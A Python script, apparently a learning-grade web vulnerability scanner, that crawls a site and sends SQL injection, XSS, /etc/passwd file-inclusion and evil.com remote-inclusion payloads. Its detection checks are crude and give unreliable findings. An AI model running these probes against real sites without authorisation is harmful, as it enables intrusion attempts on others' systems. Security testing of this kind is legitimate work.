import requests
from bs4 import BeautifulSoup
import random
import time
import re
import urllib.parse

# Function to fetch the page content
def fetch_page(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.text
        else:
            print(f"Error fetching {url}: {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Request failed for {url}: {e}")
        return None

# Extract all links from the page
def extract_links(page_content, base_url):
    soup = BeautifulSoup(page_content, 'html.parser')
    links = set()

    for anchor in soup.find_all('a', href=True):
        link = anchor['href']
        # Make link absolute if it is relative
        link = urllib.parse.urljoin(base_url, link)
        links.add(link)
    
    return links

# Check for basic SQL Injection vulnerability
def test_sql_injection(url):
    payloads = ["' OR '1'='1", "' OR 1=1 --", "' OR 1=1#", '" OR 1=1 --']
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            return True
    return False

# Check for basic XSS vulnerability
def test_xss(url):
    xss_payload = "<script>alert('XSS')</script>"
    test_url = url + xss_payload
    response = requests.get(test_url)
    if xss_payload in response.text:
        return True
    return False

# Check for Cross-Site Request Forgery (CSRF) vulnerability
def test_csrf(url):
    # Checking for forms and their submission
    soup = BeautifulSoup(fetch_page(url), 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        csrf_token = None
        for input_tag in inputs:
            if 'csrf' in input_tag.get('name', '').lower():
                csrf_token = input_tag['value']
        if not csrf_token:
            print(f"Potential CSRF vulnerability: {url}")
            return True
    return False

# Check for Local File Inclusion (LFI) vulnerability
def test_lfi(url):
    payloads = ["../../etc/passwd", "../etc/passwd", "/etc/passwd"]
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if "root" in response.text:
            return True
    return False

# Check for Remote File Inclusion (RFI) vulnerability
def test_rfi(url):
    payloads = ["http://evil.com/malicious_script", "http://example.com/malicious_script"]
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if "error" not in response.text:
            return True
    return False

# Crawl the website and check for vulnerabilities
def crawl_and_scan(url, depth=3, visited=None):
    if visited is None:
        visited = set()

    if depth == 0:
        return visited

    print(f"Crawling {url} at depth {depth}")
    
    page_content = fetch_page(url)
    if not page_content:
        return visited
    
    visited.add(url)
    
    # Scan for vulnerabilities
    if test_sql_injection(url):
        print(f"SQL Injection Vulnerability found: {url}")
    
    if test_xss(url):
        print(f"XSS Vulnerability found: {url}")
    
    if test_csrf(url):
        print(f"CSRF Vulnerability found: {url}")
    
    if test_lfi(url):
        print(f"LFI Vulnerability found: {url}")
    
    if test_rfi(url):
        print(f"RFI Vulnerability found: {url}")

    # Extract and crawl links on the page
    links = extract_links(page_content, url)
    for link in links:
        if link not in visited:
            visited = crawl_and_scan(link, depth - 1, visited)
            time.sleep(random.uniform(1, 3))  # To avoid overloading the server

    return visited

# Start the vulnerability scanner
if __name__ == "__main__":
    target_url = "http://dvwa.co.uk"  # Replace with the target URL
    crawl_and_scan(target_url, depth=2)
